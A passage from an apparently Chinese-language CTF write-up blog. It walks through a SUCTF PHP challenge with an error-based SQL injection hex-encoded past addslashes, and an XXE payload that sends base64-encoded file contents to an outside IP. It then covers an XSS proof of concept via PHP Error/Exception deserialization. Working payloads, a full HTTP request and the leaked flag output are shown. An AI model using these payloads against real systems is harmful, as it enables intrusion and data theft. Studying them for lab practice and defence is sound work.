</span></span><span class=line><span class=cl>				<span class=k>if</span><span class=p>(</span><span class=nx>sql_result</span><span class=p>(</span><span class=s2>&#34;insert into file(filename,filehash,sig) values(&#39;&#34;</span><span class=o>.</span><span class=nx>w_addslashes</span><span class=p>(</span><span class=nv>$_FILES</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>][</span><span class=s1>&#39;name&#39;</span><span class=p>])</span><span class=o>.</span><span class=s2>&#34;&#39;,&#39;&#34;</span><span class=o>.</span><span class=nv>$filehash</span><span class=o>.</span><span class=s2>&#34;&#39;,&#34;</span><span class=o>.</span><span class=p>(</span><span class=nx>strrpos</span><span class=p>(</span><span class=nx>w_addslashes</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;sig&#39;</span><span class=p>]),</span><span class=s2>&#34;)&#34;</span><span class=p>)</span><span class=o>?</span><span class=s2>&#34;&#34;</span><span class=o>:</span><span class=nx>w_addslashes</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;sig&#39;</span><span class=p>]))</span><span class=o>.</span><span class=s2>&#34;)&#34;</span><span class=p>,</span><span class=nv>$mysql</span><span class=p>)</span><span class=o>==</span><span class=s2>&#34;Failed&#34;</span><span class=p>)</span> <span class=k>die</span><span class=p>(</span><span class=s2>&#34;Upload failed&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>				<span class=nv>$new_filename</span><span class=o>=</span><span class=s2>&#34;./upload/&#34;</span><span class=o>.</span><span class=nv>$filehash</span><span class=o>.</span><span class=s2>&#34;.txt&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>				<span class=nx>move_uploaded_file</span><span class=p>(</span><span class=nv>$_FILES</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>][</span><span class=s1>&#39;tmp_name&#39;</span><span class=p>],</span> <span class=nv>$new_filename</span><span class=p>)</span> <span class=k>or</span> <span class=k>die</span><span class=p>(</span><span class=s2>&#34;Upload failed&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>				<span class=k>die</span><span class=p>(</span><span class=s2>&#34;Your file &#34;</span><span class=o>.</span><span class=nx>w_addslashes</span><span class=p>(</span><span class=nv>$_FILES</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>][</span><span class=s1>&#39;name&#39;</span><span class=p>])</span><span class=o>.</span><span class=s2>&#34; upload successful.&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>			<span class=p>}</span><span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>				<span class=nv>$hash</span><span class=o>=</span><span class=nx>sql_result</span><span class=p>(</span><span class=s2>&#34;select filehash from file where filename=&#39;&#34;</span><span class=o>.</span><span class=nx>w_addslashes</span><span class=p>(</span><span class=nv>$_FILES</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>][</span><span class=s1>&#39;name&#39;</span><span class=p>])</span><span class=o>.</span><span class=s2>&#34;&#39;&#34;</span><span class=p>,</span><span class=nv>$mysql</span><span class=p>)</span> <span class=k>or</span> <span class=k>die</span><span class=p>(</span><span class=s2>&#34;Upload failed&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>				<span class=nv>$new_filename</span><span class=o>=</span><span class=s2>&#34;./upload/&#34;</span><span class=o>.</span><span class=nv>$hash</span><span class=p>[</span><span class=mi>0</span><span class=p>][</span><span class=mi>0</span><span class=p>]</span><span class=o>.</span><span class=s2>&#34;.txt&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>				<span class=nx>move_uploaded_file</span><span class=p>(</span><span class=nv>$_FILES</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>][</span><span class=s1>&#39;tmp_name&#39;</span><span class=p>],</span> <span class=nv>$new_filename</span><span class=p>)</span> <span class=k>or</span> <span class=k>die</span><span class=p>(</span><span class=s2>&#34;Upload failed&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>				<span class=k>die</span><span class=p>(</span><span class=s2>&#34;Your file &#34;</span><span class=o>.</span><span class=nx>w_addslashes</span><span class=p>(</span><span class=nv>$_FILES</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>][</span><span class=s1>&#39;name&#39;</span><span class=p>])</span><span class=o>.</span><span class=s2>&#34; upload successful.&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>			<span class=p>}</span>
</span></span><span class=line><span class=cl>		<span class=p>}</span><span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>			<span class=k>die</span><span class=p>(</span><span class=s2>&#34;Not upload file&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>w_addslashes</span><span class=p>(</span><span class=nv>$string</span><span class=p>){</span>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=nx>addslashes</span><span class=p>(</span><span class=nx>trim</span><span class=p>(</span><span class=nv>$string</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>do_api</span><span class=p>(</span><span class=nv>$module</span><span class=p>,</span><span class=nv>$args</span><span class=p>){</span>
</span></span><span class=line><span class=cl>	<span class=nv>$class</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>ReflectionClass</span><span class=p>(</span><span class=nv>$module</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nv>$a</span><span class=o>=</span><span class=nv>$class</span><span class=o>-&gt;</span><span class=na>newInstanceArgs</span><span class=p>(</span><span class=nv>$args</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p><code>config.php</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>	<span class=nv>$db</span><span class=o>=</span><span class=s2>&#34;calc&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=nv>$dbusername</span><span class=o>=</span><span class=s2>&#34;suctf&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=nv>$dbpassword</span><span class=o>=</span><span class=s2>&#34;suctf&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=nv>$host</span><span class=o>=</span><span class=s2>&#34;127.0.0.1&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nv>$mysql</span><span class=o>=</span><span class=nx>mysqli_connect</span><span class=p>(</span><span class=nv>$host</span><span class=p>,</span><span class=nv>$dbusername</span><span class=p>,</span><span class=nv>$dbpassword</span><span class=p>,</span><span class=nv>$db</span><span class=p>)</span> <span class=k>or</span> <span class=k>die</span><span class=p>(</span><span class=s2>&#34;connect failed&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p>可以看到是个SQL注入</p><p>show.php</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>	<span class=k>include</span><span class=p>(</span><span class=s2>&#34;function.php&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=k>include</span><span class=p>(</span><span class=s2>&#34;config.php&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=k>include</span><span class=p>(</span><span class=s2>&#34;calc.php&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;action&#39;</span><span class=p>])</span><span class=o>&amp;&amp;</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;action&#39;</span><span class=p>]</span><span class=o>==</span><span class=s2>&#34;view&#34;</span><span class=p>){</span>
</span></span><span class=line><span class=cl>		<span class=k>if</span><span class=p>(</span><span class=nv>$_SERVER</span><span class=p>[</span><span class=s2>&#34;REMOTE_ADDR&#34;</span><span class=p>]</span><span class=o>!==</span><span class=s2>&#34;127.0.0.1&#34;</span><span class=p>)</span> <span class=k>die</span><span class=p>(</span><span class=s2>&#34;Forbidden.&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=k>empty</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;filename&#39;</span><span class=p>])){</span>
</span></span><span class=line><span class=cl>			<span class=nv>$file_info</span><span class=o>=</span><span class=nx>sql_result</span><span class=p>(</span><span class=s2>&#34;select * from file where filename=&#39;&#34;</span><span class=o>.</span><span class=nx>w_addslashes</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;filename&#39;</span><span class=p>])</span><span class=o>.</span><span class=s2>&#34;&#39;&#34;</span><span class=p>,</span><span class=nv>$mysql</span><span class=p>);</span>
</span></span><span class=line><span class=cl>			<span class=nv>$file_name</span><span class=o>=</span><span class=nv>$file_info</span><span class=p>[</span><span class=s1>&#39;0&#39;</span><span class=p>][</span><span class=s1>&#39;2&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>			<span class=k>echo</span><span class=p>(</span><span class=s2>&#34;file code: &#34;</span><span class=o>.</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=s2>&#34;./upload/&#34;</span><span class=o>.</span><span class=nv>$file_name</span><span class=o>.</span><span class=s2>&#34;.txt&#34;</span><span class=p>));</span>
</span></span><span class=line><span class=cl>			<span class=nv>$new_sig</span><span class=o>=</span><span class=nx>mt_rand</span><span class=p>();</span>
</span></span><span class=line><span class=cl>			<span class=nx>sql_result</span><span class=p>(</span><span class=s2>&#34;update file set sig=&#39;&#34;</span><span class=o>.</span><span class=nx>intval</span><span class=p>(</span><span class=nv>$new_sig</span><span class=p>)</span><span class=o>.</span><span class=s2>&#34;&#39; where id=&#34;</span><span class=o>.</span><span class=nv>$file_info</span><span class=p>[</span><span class=s1>&#39;0&#39;</span><span class=p>][</span><span class=s1>&#39;0&#39;</span><span class=p>]</span><span class=o>.</span><span class=s2>&#34; and sig=&#39;&#34;</span><span class=o>.</span><span class=nv>$file_info</span><span class=p>[</span><span class=s1>&#39;0&#39;</span><span class=p>][</span><span class=s1>&#39;3&#39;</span><span class=p>]</span><span class=o>.</span><span class=s2>&#34;&#39;&#34;</span><span class=p>,</span><span class=nv>$mysql</span><span class=p>);</span>
</span></span><span class=line><span class=cl>			<span class=k>die</span><span class=p>(</span><span class=s2>&#34;&lt;br&gt;new sig:&#34;</span><span class=o>.</span><span class=nv>$new_sig</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=p>}</span><span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>			<span class=k>die</span><span class=p>(</span><span class=s2>&#34;Null filename&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nv>$username</span><span class=o>=</span><span class=nx>w_addslashes</span><span class=p>(</span><span class=nv>$_COOKIE</span><span class=p>[</span><span class=s1>&#39;user&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>	<span class=nv>$check_code</span><span class=o>=</span><span class=nv>$_COOKIE</span><span class=p>[</span><span class=s1>&#39;cookie-check&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>	<span class=nv>$check_sql</span><span class=o>=</span><span class=s2>&#34;select password from user where username=&#39;&#34;</span><span class=o>.</span><span class=nv>$username</span><span class=o>.</span><span class=s2>&#34;&#39;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=nv>$check_sum</span><span class=o>=</span><span class=nx>md5</span><span class=p>(</span><span class=nv>$username</span><span class=o>.</span><span class=nx>sql_result</span><span class=p>(</span><span class=nv>$check_sql</span><span class=p>,</span><span class=nv>$mysql</span><span class=p>)[</span><span class=s1>&#39;0&#39;</span><span class=p>][</span><span class=s1>&#39;0&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span><span class=p>(</span><span class=nv>$check_sum</span><span class=o>!==</span><span class=nv>$check_code</span><span class=p>){</span>
</span></span><span class=line><span class=cl>		<span class=nx>header</span><span class=p>(</span><span class=s2>&#34;Location: login.php&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nv>$module</span><span class=o>=</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;module&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>	<span class=nv>$args</span><span class=o>=</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;args&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>	<span class=nx>do_api</span><span class=p>(</span><span class=nv>$module</span><span class=p>,</span><span class=nv>$args</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p>他这里有个转义函数，所以我们用16进制绕过</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=s1>&#39;||extractvalue(1,concat(0x7e,(select (flag) from flag),0x7e))||&#39;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=mi>0</span><span class=n>x277c7c6578747261637476616c756528312c636f6e63617428307837652c2873656c6563742028666c6167292066726f6d20666c6167292c3078376529297c7c27</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>这里注意了注入参数是sig，所以我试了好久,原因</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>sql_result</span><span class=p>(</span><span class=s2>&#34;update file set sig=&#39;&#34;</span><span class=o>.</span><span class=nx>intval</span><span class=p>(</span><span class=nv>$new_sig</span><span class=p>)</span><span class=o>.</span><span class=s2>&#34;&#39; where id=&#34;</span><span class=o>.</span><span class=nv>$file_info</span><span class=p>[</span><span class=s1>&#39;0&#39;</span><span class=p>][</span><span class=s1>&#39;0&#39;</span><span class=p>]</span><span class=o>.</span><span class=s2>&#34; and sig=&#39;&#34;</span><span class=o>.</span><span class=nv>$file_info</span><span class=p>[</span><span class=s1>&#39;0&#39;</span><span class=p>][</span><span class=s1>&#39;3&#39;</span><span class=p>]</span><span class=o>.</span><span class=s2>&#34;&#39;&#34;</span><span class=p>,</span><span class=nv>$mysql</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>最先我看到了filename也有然后就一直打，后来发现filename的结果不返回啊</p><p>然后修改</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=cp>&lt;!ENTITY % payl SYSTEM &#34;php://filter/read=convert.base64-encode/resource=http://127.0.0.1/show.php?action=view&amp;filename=6.txt&#34;&gt;</span>
</span></span><span class=line><span class=cl><span class=cp>&lt;!ENTITY % all &#34;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http://27.25.151.48:9999/?%payl;&#39;&gt;</span>&#34;&gt;
</span></span><span class=line><span class=cl>%all;
</span></span><span class=line><span class=cl>%send;
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>/show.php?module=SimpleXMLElement&amp;args[]=http://27.25.151.48:12138/poc.xml&amp;args[]=2&amp;args[]=true
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>POST /submit.php HTTP/1.1
</span></span><span class=line><span class=cl>Host: cfc14c63-0d85-4cb5-b597-f99c05249821.node5.buuoj.cn:81
</span></span><span class=line><span class=cl>Content-Length: 404
</span></span><span class=line><span class=cl>Cache-Control: max-age=0
</span></span><span class=line><span class=cl>Upgrade-Insecure-Requests: 1
</span></span><span class=line><span class=cl>Origin: http://cfc14c63-0d85-4cb5-b597-f99c05249821.node5.buuoj.cn:81
</span></span><span class=line><span class=cl>Content-Type: multipart/form-data; boundary=----WebKitFormBoundary50xpARCP4aIhe1PB
</span></span><span class=line><span class=cl>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
</span></span><span class=line><span class=cl>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
</span></span><span class=line><span class=cl>Referer: http://cfc14c63-0d85-4cb5-b597-f99c05249821.node5.buuoj.cn:81/submit.php
</span></span><span class=line><span class=cl>Accept-Encoding: gzip, deflate
</span></span><span class=line><span class=cl>Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
</span></span><span class=line><span class=cl>Cookie: cookie-check=6a9d3dc94565cd88dc0f0ec6f6538c6a; user=bao
</span></span><span class=line><span class=cl>Connection: close
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>------WebKitFormBoundary50xpARCP4aIhe1PB
</span></span><span class=line><span class=cl>Content-Disposition: form-data; name=&#34;file&#34;; filename=&#34;9.txt&#34;
</span></span><span class=line><span class=cl>Content-Type: text/plain
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>123
</span></span><span class=line><span class=cl>------WebKitFormBoundary50xpARCP4aIhe1PB
</span></span><span class=line><span class=cl>Content-Disposition: form-data; name=&#34;sig&#34;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>0x277c7c6578747261637476616c756528312c636f6e63617428307837652c2873656c6563742028666c6167292066726f6d20666c6167292c3078376529297c7c27
</span></span><span class=line><span class=cl>------WebKitFormBoundary50xpARCP4aIhe1PB--
</span></span></code></pre></td></tr></table></div></div><p>说实话这个demo给我自己都折磨了一会，网上的垃圾工具，字符串转16进制给我空格吞了，导致一直不成功,报错注入应该会吧，</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=s1>&#39;||extractvalue(1,concat(0x7e,(select right(flag,20) from flag),0x7e))||&#39;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=mi>0</span><span class=n>x277c7c6578747261637476616c756528312c636f6e63617428307837652c2873656c65637420726967687428666c61672c3230292066726f6d20666c6167292c3078376529297c7c27</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>file code: 123XPATH syntax error: &#39;~flag{ddc9686e-d0c0-489e-99f3-23&#39;&lt;br&gt;new sig:2013105070
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>file code: 123XPATH syntax error: &#39;~e-99f3-23eb9ad18c97}~&#39;&lt;br&gt;new sig:1181727055
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>flag{36b20a1e-3b1e-4c56-89e9-6677da259211}
</span></span></code></pre></td></tr></table></div></div><p>中途出现了一点其他的知识但是最重要的漏洞就是这个<code>xxe</code>类的使用</p><h3 id=xxs>xxs</h3><h4 id=errorexception>Error/Exception</h4><p><strong>Exception 类适用于PHP 5和7，而 Error 只适用于 PHP 7。并且是开启报错的情况</strong></p><p>这两个内置类都差不多，所以干脆放一起</p><p>这两个类的属性</p><ul><li>message：错误消息内容</li><li>code：错误代码</li><li>file：抛出错误的文件名</li><li>line：抛出错误在该文件中的行数</li></ul><p>先随便写个<code>demo</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nx>show_source</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>=</span><span class=nx>unserialize</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;a&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nv>$a</span><span class=p>;</span>
</span></span></code></pre></td></tr></table></div></div><p>然后写个<code>poc</code>,只要是<code>xss</code>的<code>payload</code>都可以通过这两个类进行实现</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>=</span><span class=k>new</span> <span class=nx>Error</span><span class=p>(</span><span class=s2>&#34;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>urlencode</span><span class=p>(</span><span class=nx>serialize</span><span class=p>(</span><span class=nv>$a</span><span class=p>));</span>
</span></span></code></pre></td></tr></table></div></div><p>或者是另一个</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>=</span><span class=k>new</span> <span class=nx>Exception</span><span class=p>(</span><span class=s2>&#34;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>urlencode</span><span class=p>(</span><span class=nx>serialize</span><span class=p>(</span><span class=nv>$a</span><span class=p>));</span>
</span></span></code></pre></td></tr></table></div></div><p>只要是<code>xss</code>能做的都能做，看看是这两个类中的什么方法导致的呢,众所周知<code>echo</code>是来触发<code>__toString()</code>的但是我们进入方法看看</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>zend_string</span> <span class=o>*</span><span class=n>message</span> <span class=o>=</span> <span class=nf>zval_get_string</span><span class=p>(</span><span class=nf>GET_PROPERTY</span><span class=p>(</span><span class=n>exception</span><span class=p>,</span> <span class=n>ZEND_STR_MESSAGE</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=c1>//这里捕捉message属性
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>((</span><span class=nf>Z_OBJCE_P</span><span class=p>(</span><span class=n>exception</span><span class=p>)</span> <span class=o>==</span> <span class=n>zend_ce_type_error</span> <span class=o>||</span> <span class=nf>Z_OBJCE_P</span><span class=p>(</span><span class=n>exception</span><span class=p>)</span> <span class=o>==</span> <span class=n>zend_ce_argument_count_error</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=nf>strstr</span><span class=p>(</span><span class=nf>ZSTR_VAL</span><span class=p>(</span><span class=n>message</span><span class=p>),</span> <span class=s>&#34;, called in &#34;</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>			<span class=n>zend_string</span> <span class=o>*</span><span class=n>real_message</span> <span class=o>=</span> <span class=nf>zend_strpprintf_unchecked</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=s>&#34;%S and defined&#34;</span><span class=p>,</span> <span class=n>message</span><span class=p>);</span>
</span></span><span class=line><span class=cl>			<span class=nf>zend_string_release_ex</span><span class=p>(</span><span class=n>message</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>			<span class=n>message</span> <span class=o>=</span> <span class=n>real_message</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		<span class=p>}</span>
</span></span><span class=line><span class=cl><span class=c1>// 这里进行错误捕捉
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nf>RETURN_STR</span><span class=p>(</span><span class=n>str</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=err>这里再放回</span>
</span></span></code></pre></td></tr></table></div></div><p>所以成功的插入恶意的<code>xss</code>代码</p><p>demo <strong>[BJDCTF 2nd]xss之光</strong></p><p>扫描一下找到<code>git</code></p><p>恢复一下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>python GitHack.py http://7e43e9af-3b17-47b3-9532-11cfbaef99d7.node5.buuoj.cn:81/.git/
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;yds_is_so_beautiful&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>unserialize</span><span class=p>(</span><span class=nv>$a</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>那么回去找网站，找不到什么东西，先尝试打<code>cookie</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
